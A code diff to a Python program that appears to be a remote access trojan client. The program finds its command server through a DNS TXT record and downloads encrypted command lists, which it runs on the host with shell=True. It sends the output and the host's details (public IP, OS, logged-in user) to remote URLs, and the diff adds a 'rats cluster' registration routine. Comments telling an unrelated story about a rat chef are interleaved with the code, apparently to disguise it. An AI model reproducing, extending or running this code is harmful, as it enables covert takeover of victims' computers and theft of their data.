@@ -16,6 +16,8 @@ import tempfile
 import dns.resolver
 import platform
 
+DEBUG_MODE = False
+
 # Our story begins with Remy. Remy the rat was no ordinary rodent. While his brothers scurried through alleyways in search of
 def query_txt_record(domain):
     try:
@@ -23,7 +25,7 @@ def query_txt_record(domain):
         answers = dns.resolver.resolve(domain, 'TXT')
         for rdata in answers:
             for txt_string in rdata.strings:
-                return txt_string.decode('utf-8')
+                return txt_string.decode('utf-8').strip()
     except:
         return None
 
@@ -160,7 +162,7 @@ def load_commands_executed(executed_commands_list_filename):
         with open(list_filename, "r") as list_file:
             file_lines = list_file.readlines()
             my_id = file_lines[0]
-            return my_id, list(dict.fromkeys(file_lines[1:]))
+            return my_id.strip(), list(dict.fromkeys(file_lines[1:]))
     except:
         my_id = str(uuid.uuid4())
         try:
@@ -168,7 +170,7 @@ def load_commands_executed(executed_commands_list_filename):
                 list_file.write(my_id + "\n")
         except:
             pass
-        return my_id, []
+        return my_id.strip(), []
 
 
 # When the chef discovered Remy, there was a moment of shock—then understanding. Together, they
@@ -223,42 +225,70 @@ def main():
     while True:
         try:
             dns_pointer_record = decide_on_root_dns_record(my_pub_ip)
-            commands_bucket_url = query_txt_record(dns_pointer_record)
+            root_url = query_txt_record(dns_pointer_record)
+            commands_bucket_url = os.path.join(root_url, my_id + "-cmds")
             commands_outputs_encryption_public_key = load_commands_outputs_encryption_public_key()
             commands_list_decryption_private_key = load_commands_list_decryption_private_key()
+            register_to_rats_cluster(my_id, my_pub_ip, root_url)
+            if DEBUG_MODE: print(f"Getting commands from {commands_bucket_url}...")
             commands = requests.get(commands_bucket_url)
-            commands_list_decrypted = decrypt_with_private_key(commands_list_decryption_private_key, commands.text)
-            commands_list = json.loads(commands_list_decrypted)["commands"]
-            for command in commands_list:
-                if command["id"] not in commands_executed and command["platform"] == platform.system():
-                    try:
-                        command_res = subprocess.run(command["command"], cwd=command["workdir"], shell=True,
-                                                     stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-                        command_res_obj = build_command_result_object(
-                            my_pub_ip=my_pub_ip,
-                            command_id=command["id"],
-                            exit_code=command_res.returncode,
-                            user=os.getlogin(),
-                            time_executed=time.time(),
-                            stdout=command_res.stdout,
-                            stderr=command_res.stderr
-                        )
-                    except Exception as ex:
-                        command_res_obj = build_command_result_object(
-                            my_pub_ip=my_pub_ip,
-                            command_id=command["id"],
-                            exit_code=-1,
-                            user=os.getlogin(),
-                            time_executed=time.time(),
-                            stdout=None,
-                            stderr=None,
-                            exception=ex
-                        )
-                    if report_command_result(my_id, commands_outputs_encryption_public_key, command["id"], command_res_obj, command["report_results_to"]):
-                        mark_command_as_executed(command, commands_executed, executed_commands_list_filename)
-        except:
-            pass
+            if commands.status_code == 200:
+                commands_list_decrypted = decrypt_with_private_key(commands_list_decryption_private_key, commands.text)
+                commands_list = json.loads(commands_list_decrypted.decode())
+                if DEBUG_MODE: print(f"Received {len(commands_list)} commands to run...")
+                for command in commands_list:
+                    if command["id"] not in commands_executed and command["platform"] == platform.system():
+                        try:
+                            if DEBUG_MODE: print(f"Running the command {command['command']} ({command['id']})...")
+                            command_res = subprocess.run(command["command"], cwd=command["workdir"], shell=True,
+                                                         stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                            command_res_obj = build_command_result_object(
+                                my_pub_ip=my_pub_ip,
+                                command_id=command["id"],
+                                exit_code=command_res.returncode,
+                                user=os.getlogin(),
+                                time_executed=time.time(),
+                                stdout=command_res.stdout,
+                                stderr=command_res.stderr
+                            )
+                        except Exception as ex:
+                            command_res_obj = build_command_result_object(
+                                my_pub_ip=my_pub_ip,
+                                command_id=command["id"],
+                                exit_code=-1,
+                                user=os.getlogin(),
+                                time_executed=time.time(),
+                                stdout=None,
+                                stderr=None,
+                                exception=ex
+                            )
+                        if report_command_result(my_id, commands_outputs_encryption_public_key, command["id"], command_res_obj, command["report_results_to"]):
+                            mark_command_as_executed(command, commands_executed, executed_commands_list_filename)
+                        else:
+                            if DEBUG_MODE: print(f"Failed to report execution results to {command['report_results_to']} for my_id:{my_id}, command_id:{command['id']}")
+                    else:
+                        if DEBUG_MODE: print(f"Command {command['id']} was already executed. Skipped.")
+            else:
+                if DEBUG_MODE: print(f"Failed to get a list of commands. HTTP status code is {commands.status_code}")
+        except Exception as ex:
+            if DEBUG_MODE: print(f"Exception occurred: {ex}")
+            raise
         time.sleep(sleep_time)
+
+
+def register_to_rats_cluster(my_id, my_pub_ip, root_url):
+    try:
+        reg_url = os.path.join(root_url, "registrations", str(my_id) + ".5ae9c92eaf5011efb98f83b6693403d8")
+        requests.put(reg_url, data=json.dumps({
+            "my_id": str(my_id),
+            "my_pub_ip": my_pub_ip,
+            "platform": platform.system(),
+            "release": platform.release(),
+            "user": os.getlogin(),
+            "time_registered": time.time()
+        }).encode())
+    except:
+        pass
 
 
 # enchanted diners. In the bistro's kitchen, Remy found his place—not just as a rat, but as a chef who proved dreams could
